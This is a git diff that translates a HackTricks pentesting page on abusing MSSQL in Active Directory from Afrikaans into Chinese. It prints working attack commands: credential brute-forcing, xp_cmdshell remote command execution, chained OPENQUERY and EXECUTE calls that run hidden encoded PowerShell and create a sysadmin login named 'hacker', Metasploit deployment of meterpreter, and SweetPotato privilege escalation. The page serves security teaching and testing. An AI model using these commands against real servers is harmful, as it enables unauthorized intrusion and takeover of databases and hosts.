@@ -1,16 +1,16 @@
-# MSSQL AD Misbruik
+# MSSQL AD 滥用
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
@@ -19,10 +19,10 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 {% embed url="https://websec.nl/" %}
 
-## **MSSQL Enumerasie / Ontdekking**
+## **MSSQL 枚举 / 发现**
 
 ### Python
-Die [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) hulpmiddel is gebaseer op impacket, en laat ook outentisering toe met behulp van kerberos kaartjies, en aanval deur skakelkettings.
+[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) 工具基于 impacket，允许使用 kerberos 票证进行身份验证，并通过链接链进行攻击。
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
 ```shell
@@ -79,7 +79,7 @@ mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
 mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
 
 ```
-### Opname vanaf die netwerk sonder domeinsessie
+### 在没有域会话的情况下从网络枚举
 ```
 # Interactive mode
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
@@ -87,11 +87,11 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ---
 ###  Powershell
 
-Die powershell-module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is baie nuttig in hierdie geval.
+在这种情况下，powershell 模块 [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) 非常有用。
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
-### Opname vanaf die netwerk sonder domeinsessie
+### 在没有域会话的情况下从网络枚举
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -105,7 +105,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-### Opname vanaf binne die domein
+### 从域内部枚举
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -124,9 +124,9 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## MSSQL Basiese Misbruik
+## MSSQL 基本滥用
 
-### Toegang tot DB
+### 访问数据库
 ```powershell
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
@@ -140,26 +140,26 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-Dit mag ook moontlik wees om **opdragte** binne die MSSQL-gasheer uit te voer
+在 MSSQL 主机内部**执行命令**也可能是可行的。
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Check in die bladsy genoem in die **volgende afdeling hoe om dit handmatig te doen.**
+检查**以下部分**中提到的页面以了解如何手动执行此操作。
 
-### MSSQL Basiese Hacking Tricks
+### MSSQL 基本黑客技巧
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
 {% endcontent-ref %}
 
-## MSSQL Vertroude Skakels
+## MSSQL 受信任链接
 
-As 'n MSSQL-instansie vertrou (databasis skakel) deur 'n ander MSSQL-instansie. As die gebruiker voorregte oor die vertroude databasis het, sal hy in staat wees om **die vertrouensverhouding te gebruik om navrae ook in die ander instansie uit te voer**. Hierdie vertroue kan geketting word en op 'n sekere punt mag die gebruiker in staat wees om 'n verkeerd geconfigureerde databasis te vind waar hy opdragte kan uitvoer.
+如果一个 MSSQL 实例被另一个 MSSQL 实例信任（数据库链接）。如果用户对受信任的数据库拥有权限，他将能够**利用信任关系在另一个实例中执行查询**。这些信任可以链式连接，在某些情况下，用户可能能够找到一些配置错误的数据库，在那里他可以执行命令。
 
-**Die skakels tussen databasisse werk selfs oor woudvertroue.**
+**数据库之间的链接甚至可以跨森林信任工作。**
 
-### Powershell Misbruik
+### Powershell 滥用
 ```powershell
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
@@ -193,44 +193,44 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-Jy kan maklik vir vertroude skakels kyk met metasploit.
+您可以使用 metasploit 轻松检查受信任的链接。
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Let wel dat metasploit slegs die `openquery()` funksie in MSSQL sal probeer misbruik maak (so, as jy nie 'n opdrag met `openquery()` kan uitvoer nie, sal jy die `EXECUTE` metode **handmatig** moet probeer om opdragte uit te voer, sien meer hieronder.)
+注意，metasploit 只会尝试在 MSSQL 中滥用 `openquery()` 函数（因此，如果您无法使用 `openquery()` 执行命令，您将需要尝试 **手动** 使用 `EXECUTE` 方法来执行命令，更多信息见下文。）
 
-### Handmatig - Openquery()
+### 手动 - Openquery()
 
-Van **Linux** kan jy 'n MSSQL konsole-skal met **sqsh** en **mssqlclient.py** verkry.
+从 **Linux** 您可以使用 **sqsh** 和 **mssqlclient.py** 获取 MSSQL 控制台 shell。
 
-Van **Windows** kan jy ook die skakels vind en opdragte handmatig uitvoer met 'n **MSSQL kliënt soos** [**HeidiSQL**](https://www.heidisql.com)
+从 **Windows** 您也可以找到链接并使用 **MSSQL 客户端如** [**HeidiSQL**](https://www.heidisql.com) 手动执行命令。
 
-_Registrasie met Windows-outeentifikasie:_
+_使用 Windows 身份验证登录：_
 
 ![](<../../.gitbook/assets/image (808).png>)
 
-#### Vind Betroubare Skakels
+#### 查找可信链接
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
 ![](<../../.gitbook/assets/image (716).png>)
 
-#### Voer navrae uit in betroubare skakel
+#### 在可信链接中执行查询
 
-Voer navrae uit deur die skakel (voorbeeld: vind meer skakels in die nuwe toeganklike instansie):
+通过链接执行查询（示例：在新的可访问实例中查找更多链接）：
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 {% hint style="warning" %}
-Kyk waar dubbele en enkele aanhalingsmerke gebruik word, dit is belangrik om dit op daardie manier te gebruik.
+检查双引号和单引号的使用，正确使用它们非常重要。
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (643).png>)
 
-Jy kan hierdie vertroude skakelsketting handmatig vir ewig voortset.
+您可以手动无限制地继续这些受信任链接的链。
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -238,39 +238,39 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-If you cannot perform actions like `exec xp_cmdshell` from `openquery()` try with the `EXECUTE` method.
+如果您无法通过 `openquery()` 执行像 `exec xp_cmdshell` 这样的操作，请尝试使用 `EXECUTE` 方法。
 
-### Handmatig - EXECUTE
+### 手动 - EXECUTE
 
-Jy kan ook vertroude skakels misbruik maak deur `EXECUTE`:
+您还可以使用 `EXECUTE` 滥用受信任的链接：
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Plaaslike Privilege Escalation
+## 本地权限提升
 
-Die **MSSQL plaaslike gebruiker** het gewoonlik 'n spesiale tipe voorreg genaamd **`SeImpersonatePrivilege`**. Dit stel die rekening in staat om "‘n kliënt na verifikasie te verteenwoordig".
+**MSSQL 本地用户** 通常具有一种特殊类型的权限，称为 **`SeImpersonatePrivilege`**。这允许该账户在身份验证后“模拟客户端”。
 
-‘n Strategie wat baie outeurs ontwikkel het, is om 'n SYSTEM-diens te dwing om te verifieer by 'n rogue of man-in-the-middle diens wat die aanvaller skep. Hierdie rogue diens kan dan die SYSTEM-diens verteenwoordig terwyl dit probeer om te verifieer.
+许多作者提出的一种策略是强制 SYSTEM 服务向攻击者创建的恶意或中间人服务进行身份验证。这个恶意服务能够在 SYSTEM 服务尝试进行身份验证时模拟该服务。
 
-[SweetPotato](https://github.com/CCob/SweetPotato) het 'n versameling van hierdie verskillende tegnieke wat uitgevoer kan word via Beacon se `execute-assembly` opdrag.
+[SweetPotato](https://github.com/CCob/SweetPotato) 收集了这些可以通过 Beacon 的 `execute-assembly` 命令执行的各种技术。
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
